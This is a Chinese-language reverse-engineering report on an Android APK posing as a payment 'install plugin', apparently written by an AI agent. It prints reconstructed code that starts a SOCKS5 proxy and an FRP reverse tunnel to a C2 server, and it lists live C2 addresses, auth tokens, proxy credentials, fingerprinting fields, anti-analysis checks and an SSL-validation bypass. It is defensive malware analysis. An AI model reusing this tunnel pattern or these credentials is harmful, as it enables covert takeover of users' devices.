APK 逆向分析报告：ip4.6.apk

  1. 应用基本信息
  ┌────────────────┬────────────────────────────────────────────────────┐
  │      项目      │                         值                         │
  ├────────────────┼────────────────────────────────────────────────────┤
  │ 包名           │ xyz.rush.plugin                                    │
  ├────────────────┼────────────────────────────────────────────────────┤
  │ 应用名         │ InstallPlugin（显示为 "RushPayPlugin"）            │
  ├────────────────┼────────────────────────────────────────────────────┤
  │ Application 类 │ com.installPlugin.rush.MainApplication             │
  ├────────────────┼────────────────────────────────────────────────────┤
  │ 启动 Activity  │ com.installPlugin.launch.LauncherActivity          │
  ├────────────────┼────────────────────────────────────────────────────┤
  │ 后台服务       │ com.installPlugin.launch.BackgroundService         │
  ├────────────────┼────────────────────────────────────────────────────┤
  │ Target SDK     │ 34 (Android 14)                                    │
  ├────────────────┼────────────────────────────────────────────────────┤
  │ 原生库         │ libgoproxy.so（arm64: 14MB, armv7: 14MB），Go 编译 │
  └────────────────┴────────────────────────────────────────────────────┘
  2. 权限声明

  INTERNET                       — 网络访问
  ACCESS_NETWORK_STATE           — 网络状态检测
  REQUEST_INSTALL_PACKAGES       — 安装第三方 APK
  POST_NOTIFICATIONS             — 发送通知
  FOREGROUND_SERVICE             — 前台服务
  FOREGROUND_SERVICE_DATA_SYNC   — 数据同步前台服务
  com.google.android.gms.permission.AD_ID  — 获取广告 ID

  3. 应用架构总览

  ┌─────────────────────────────────────────────────────────┐
  │                    Java/Kotlin Layer                     │
  │                     (classes.dex, 2.7MB)                 │
  │                                                         │
  │  MainApplication ──► DeviceUtils.init() 设备指纹采集    │
  │       │              EventThread.init() 遥测系统初始化   │
  │       ▼                                                 │
  │  BackgroundService (前台服务)                            │
  │       │                                                 │
  │       ▼                                                 │
  │  MainService ──► 加载 libgoproxy.so                     │
  │       │          启动 SOCKS5 代理                        │
  │       │          启动 FRP 反向隧道                       │
  │       ▼                                                 │
  │  MainActivity ──► 获取应用列表                           │
  │       │           下载并安装 APK                         │
  │       ▼                                                 │
  │  NetworkChangeReceiver ──► 网络变化时重启代理            │
  │  InstallReceiver ──► 监控 APK 安装结果                  │
  ├─────────────────────────────────────────────────────────┤
  │               Native Layer (libgoproxy.so, Go)          │
  │                                                         │
  │  proxylib.Proxylib (JNI 接口)                           │
  │    ├─ startProxyServer()   — 本地 SOCKS5 代理           │
  │    ├─ runFrpClient()       — FRP 反向代理客户端         │
  │    ├─ queryDoH()           — DNS-over-HTTPS 解析        │
  │    ├─ startPingServer()    — 心跳/keepalive             │
  │    ├─ setHardwareInfo()    — 上报设备指纹               │
  │    ├─ initVirtualSystem()  — 虚拟系统初始化             │
  │    ├─ writeConfigFile()    — 写入 FRP 配置              │
  │    └─ setAdbNetworkInfo()  — ADB 远程调试配置           │
  └─────────────────────────────────────────────────────────┘

  4. 核心业务流程

  4.1 启动流程

  1. MainApplication.onCreate() → 调用 DeviceUtils.init() 采集设备指纹（Android ID、GAID、应用签名、MediaDrm
  ID），初始化事件日志系统
  2. LauncherActivity 通过 Intent 接收参数（baseUrl, appName, mainAppCode, version, shareCode），说明此 APK 由宿主应用调用
  3. MainActivity.onCreate() → 启动 BackgroundService 前台服务，同时开始 UI 逻辑

  4.2 代理/隧道核心（MainService.startFrpClient）

  这是应用的核心恶意功能：

  // 1. 加载 Go 原生库
  System.loadLibrary("goproxy");

  // 2. 上报设备硬件信息到 Go 层
  Proxylib.setHardwareInfo(DeviceUtils.getAndroidId(), hardwareJSON);

  // 3. 启动心跳服务
  Proxylib.startPingServer(12355);

  // 4. 初始化虚拟系统
  Proxylib.initVirtualSystem();

  // 5. 在随机端口(1000-11000)启动本地 SOCKS5 代理
  Proxylib.startProxyServer("socks5", "qq123456", randomPort);

  // 6. DNS-over-HTTPS 解析 C2 域名
  String serverIP = Proxylib.queryDoH("proxy.techru.cc");
  // 备用 IP: 20.205.26.238

  // 7. 生成 FRP 配置并启动反向代理客户端
  // FRP 配置详情:
  serverAddr = "<resolved_ip>"
  serverPort = 7000
  auth.token = "Fqweasd.."
  proxy_name = "socks5:<device_android_id>"
  localIP = "127.0.0.1"
  localPort = <random_port>
  metadatas.signkey = "repack"
  metadatas.user = "socks5"
  metadatas.password = "qq123456"

  效果：设备变成一个远程可控的 SOCKS5 代理节点，攻击者可以通过 FRP 服务器（proxy.techru.cc:7000）路由流量经过受害者设备。

  4.3 应用安装/分发流程

  1. MainActivity 从 baseUrl + "/v1/member/getParamsBatch" 获取插件版本和下载链接
  2. 若本地版本低于远程版本，自动下载更新
  3. 从 baseUrl + "/v1/member/paymentApps/{mainAppCode}" 获取支付应用列表
  4. 每个应用含：appIcon, appName, packageName, version, downloadUrl
  5. 用户点击或自动下载 APK 并触发安装
  6. InstallReceiver 监控安装结果并上报

  4.4 遥测/数据回传

  日志上报端点: https://log.financeforge.win/plugin/_doc

  每条日志 (ELog) 包含:
  - tag — 事件名称（openApp, runProxy, crash 等）
  - msg — 事件参数
  - UUID — GAID
  - androidId — 设备 Android ID
  - appVersion — 应用版本号
  - application — 应用名
  - timestamp — 时间戳

  5. 设备指纹采集范围

  通用数据 (generalData)
  ┌───────────────────────┬───────────────────┐
  │         字段          │       说明        │
  ├───────────────────────┼───────────────────┤
  │ and_id                │ Android ID        │
  ├───────────────────────┼───────────────────┤
  │ gaid                  │ Google 广告 ID    │
  ├───────────────────────┼───────────────────┤
  │ imei1 / imei2         │ IMEI 双卡         │
  ├───────────────────────┼───────────────────┤
  │ meid                  │ MEID              │
  ├───────────────────────┼───────────────────┤
  │ mac                   │ MAC 地址          │
  ├───────────────────────┼───────────────────┤
  │ bluetooth_mac         │ 蓝牙 MAC          │
  ├───────────────────────┼───────────────────┤
  │ mcc / mnc             │ 移动国家码/网络码 │
  ├───────────────────────┼───────────────────┤
  │ network_operator_name │ 运营商名称        │
  ├───────────────────────┼───────────────────┤
  │ dns                   │ 本地 DNS          │
  ├───────────────────────┼───────────────────┤
  │ slot_count            │ SIM 卡槽数        │
  ├───────────────────────┼───────────────────┤
  │ language / locale_*   │ 语言/地区         │
  ├───────────────────────┼───────────────────┤
  │ security_patch        │ 安全补丁级别      │
  └───────────────────────┴───────────────────┘
  硬件数据 (hardwareData)
  ┌────────────────────────────────────────┬──────────────────────┐
  │                  字段                  │         说明         │
  ├────────────────────────────────────────┼──────────────────────┤
  │ model / brand / product                │ 设备型号/品牌/产品名 │
  ├────────────────────────────────────────┼──────────────────────┤
  │ finger_print                           │ Build 指纹           │
  ├────────────────────────────────────────┼──────────────────────┤
  │ cpu_type / cpu_min / cpu_max / cpu_cur │ CPU 信息             │
  ├────────────────────────────────────────┼──────────────────────┤
  │ board / hardware / bootloader          │ 硬件主板             │
  ├────────────────────────────────────────┼──────────────────────┤
  │ serial_number                          │ 序列号               │
  ├────────────────────────────────────────┼──────────────────────┤
  │ resolution / screen_density            │ 屏幕分辨率/密度      │
  ├────────────────────────────────────────┼──────────────────────┤
  │ is_tablet / foldable_phone             │ 设备类型             │
  ├────────────────────────────────────────┼──────────────────────┤
  │ 等共 35+ 项                            │                      │
  └────────────────────────────────────────┴──────────────────────┘
  6. C2 基础设施
  ┌──────────────┬──────────────────────────────────────────┬────────────────────────────────┐
  │     类型     │                   地址                   │              用途              │
  ├──────────────┼──────────────────────────────────────────┼────────────────────────────────┤
  │ 代理 C2 域名 │ proxy.techru.cc                          │ FRP 反向代理服务器             │
  ├──────────────┼──────────────────────────────────────────┼────────────────────────────────┤
  │ 代理 C2 IP   │ 20.205.26.238:7000                       │ FRP 服务器备用地址             │
  ├──────────────┼──────────────────────────────────────────┼────────────────────────────────┤
  │ 遥测服务器   │ https://log.financeforge.win/plugin/_doc │ 事件日志收集（Elasticsearch）  │
  ├──────────────┼──────────────────────────────────────────┼────────────────────────────────┤
  │ 开发服务器   │ http://192.168.100.222:8880              │ 默认 baseUrl（开发环境硬编码） │
  ├──────────────┼──────────────────────────────────────────┼────────────────────────────────┤
  │ FRP 认证     │ Token: Fqweasd..                         │ FRP 客户端认证令牌             │
  ├──────────────┼──────────────────────────────────────────┼────────────────────────────────┤
  │ SOCKS5 凭证  │ socks5 / qq123456                        │ 本地代理认证                   │
  └──────────────┴──────────────────────────────────────────┴────────────────────────────────┘
  7. 安全机制与反分析

  7.1 代码混淆

  - 包名/类名使用 O0/Oo 组合的混淆名称（如 O0O000Oo00o, OO0O0Oo0o0）
  - 资源文件名混淆（res/-8.xml, res/0I.png）
  - 字段和方法名大量混淆

  7.2 SSL 证书验证绕过

  HttpUtils.miTM 类完全禁用了 SSL 验证：
  - checkServerTrusted() / checkClientTrusted() 为空实现
  - getAcceptedIssuers() 返回 null
  - HostnameVerifier 始终返回 true
  - 允许中间人攻击

  7.3 反模拟器/反分析检测 (EmulatorUtils)

  - Build 指纹检测: generic, unknown, google_sdk, Emulator, Genymotion
  - CPU 检测: 读取 /proc/cpuinfo 检查 intel/amd
  - Root 检测: 扫描 8 个路径查找 su 二进制
  - 沙箱检测: 检查 APK 安装路径是否异常
  - 克隆应用检测: 进程名与包名对比
  - VPN 检测: NetworkCapabilities.hasTransport(TRANSPORT_VPN)
  - 无障碍服务检测: 检查非标准无障碍服务
  - 工作资料检测: UserManager.isManagedProfile()
  - proc maps 扫描: 读取 /proc/self/maps 检测注入

  7.4 DNS-over-HTTPS

  使用 DoH 解析 C2 域名 proxy.techru.cc，避免传统 DNS 监控

  7.5 网络安全配置

  network_security_config.xml 仅允许 192.168.100.222 的明文通信（开发环境），其他走 HTTPS

  8. 行为定性

  这是一个住宅代理 (Residential Proxy) 恶意软件，伪装为印度支付应用的"安装插件"。其核心行为：

  1. 将受害设备变为代理节点：通过 FRP 反向隧道，攻击者可将网络流量路由经过受害者的真实 IP 地址
  2. 大规模设备指纹采集：收集 50+ 项设备信息用于设备唯一标识
  3. 远程 APK 分发：可远程推送并安装任意 APK
  4. 持久化运行：前台服务 + 网络变化监听确保代理持续可用
  5. 反分析对抗：检测模拟器、Root、VPN、沙箱等分析环境
  6. ADB 远程访问能力：AdbNetworkInfo + setAdbNetworkInfo() 接口暗示具备远程 ADB 调试能力

  该应用通过印度支付生态分发，表面是帮助用户安装支付钱包应用，实际将设备纳入付费住宅代理网络。
✔ Task #5 updated: status → completed

⏺ All tasks completed. The decompiled sources are available at:
  - /tmp/ip4.6_apktool/ — decoded resources (AndroidManifest, smali, res)
  - /tmp/ip4.6_jadx/ — decompiled Java source code